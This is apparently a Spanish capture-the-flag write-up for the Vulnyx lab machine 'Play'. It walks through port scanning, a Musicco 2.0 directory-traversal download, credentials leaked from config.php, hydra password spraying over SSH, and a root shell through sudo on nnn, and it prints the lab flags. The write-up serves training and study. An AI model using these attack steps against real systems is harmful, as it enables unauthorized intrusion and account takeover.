---
icon: flag
---

# Play Vulnyx (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-20 03:58 EDT
Nmap scan report for 192.168.5.85
Host is up (0.0014s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.56 (Debian)
MAC Address: 08:00:27:E6:29:D5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.99 seconds
```

Veremos varias cosas interesantes, pero entre ellas el puerto `80` que normalmente aloja una pagina web, por lo que vamos a ir a dicha pagina a ver que vemos, entrando dentro veremos una pagina normal de `apache2` lo cual no habra nada interesante, por lo que vamos a realizar un poco de `fuzzing` a ver que vemos.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.85/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 10701]
/.html                (Status: 403) [Size: 277]
/playlist             (Status: 200) [Size: 134071]
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

Veremos un recurso compartido bastante interesante llamado `/playlist`, si entramos dentro veremos una pagina de un reproductor de musica, vamos a investigar que `software` es y que version tiene por si tuviera alguna vulnerabilidad.

Investigando un poco si vamos a los ajustes y vamos a la propia info de la aplicacion, veremos que tiene la version `2.0` y que la pagina se llama `musicco`, buscando veremos un `exploit` asociado al mismo.

URL = [ExploitDB Musicco 2.0.0 - Arbitrary Directory Download](https://www.exploit-db.com/exploits/45830)

Veremos que la siguiente ruta es vulnerable por la documentacion:

```
URL = http://localhost/[PATH]/?getAlbum&parent=[Directory]&album=Efe
```

Vamos adaptarlo a nuestras necesidades quedando algo asi:

```
URL = http://<IP>/playlist/?getAlbum&parent=../playlist&album=Efe
```

Probando varias veces, como tenemos que ir al directorio padre, tendremos que salir primero del propio directorio `playlist` y con eso se nos descargara un `.zip` el cual vamos a descomprimir a ver que vemos.

## Escalate user andy

```shell
unzip Efe.zip
```

Veremos que nos descomprime toda la estructura de carpetas de dicha pagina:

```
total 8216
drwxr-xr-x  6 root root    4096 Aug 20 04:24 .
drwxr-xr-x 28 kali kali    4096 Aug 20 03:51 ..
drwxr-xr-x  2 root root    4096 Aug 20 04:24 app
-rwx------  1 root root     503 Sep  9  2023 config.php
drwxr-xr-x  6 root root    4096 Aug 20 04:24 doc
-rwx------  1 root root    7406 Oct 28  2018 favicon.ico
-rwx------  1 root root  191644 Oct 28  2018 index.php
drwxr-xr-x 14 root root    4096 Aug 20 04:24 lib
-rwx------  1 root root     872 Oct 28  2018 manifest.json
-rwx------  1 root root    4466 Oct 28  2018 musicco.js
-rwx------  1 root root   73728 Aug 20  2025 music.db
-rwx------  1 root root     158 Oct 28  2018 offline.html
-rwx------  1 root root    5320 Oct 28  2018 README.md
drwxr-xr-x  3 root root    4096 Aug 20 04:24 theme
```

Veremos interesante el archivo llamado `config.php`, si lo leemos veremos lo siguiente:

```php
<?php
$_CONFIG['saveConfig'] = '';
$_CONFIG['users'] = array(
         array('admin', 'admin', 'true'),
         array('guest', 'guest', 'false'),
         array('unknown', 'iL0v3Mu$1c', 'false'),
);
$_CONFIG['lang'] = 'en';
$_CONFIG['musicRoot'] = 'music';
$_CONFIG['coverFileName'] = 'folder';
$_CONFIG['coverExtension'] = '.png';
$_CONFIG['loadLyricsFromFile'] = 'on';
$_CONFIG['lookUpLyrics'] = 'on';
$_CONFIG['downLoadMissingCovers'] = 'on';
$_CONFIG['searchEngine'] = '';
$_CONFIG['imageSearchEngine'] = '';
?>
```

Veremos unas credenciales en dicho archivo, pero si por `SSH` probamos las credenciales con los usuarios, no tendremos suerte, sabemos que tenemos una contraseña, vamos a probarla en diferentes usuarios a ver si hay suerte.

### Hydra

```shell
hydra -L <WORDLIST> -p 'iL0v3Mu$1c' ssh://<IP> -t 64 -I
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-20 04:33:15
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 624370 login tries (l:624370/p:1), ~9756 tries per task
[DATA] attacking ssh://192.168.5.85:22/
[22][ssh] host: 192.168.5.85   login: andy   password: iL0v3Mu$1c
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
```

Veremos que tendremos un usuario llamado `andy`, por lo que vamos a conectarnos por `SSH` de esta forma:

### SSH

```shell
ssh andy@<IP>
```

Metemos como contraseña `iL0v3Mu$1c`...

```
andy@play:~$ whoami
andy
```

Veremos que estaremos dentro, por lo que leeremos la `flag` del usuario.

> user.txt

```
d7a5677b8846501dc904115025cfcdfd
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for andy on play:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User andy may run the following commands on play:
    (root) NOPASSWD: /usr/bin/nnn
```

Veremos que podemos ejecutar el binario `nnn` como el usuario `root` por lo que vamos a realizar lo siguiente:

```shell
sudo nnn -e
#Dentro del editor
!
```

> Dentro del editor tendremos que pulsar `!` para invocar una `shell` la cual se invocara como el usuario `root`.

Info:

```
root@play:/home/andy# whoami
root
```

Con esto veremos que ya seremos `root`, por lo que leeremos la `flag` de `root`.

> root.txt

```
97703e4658a2ecad34fe4dc3bf92db1a
```
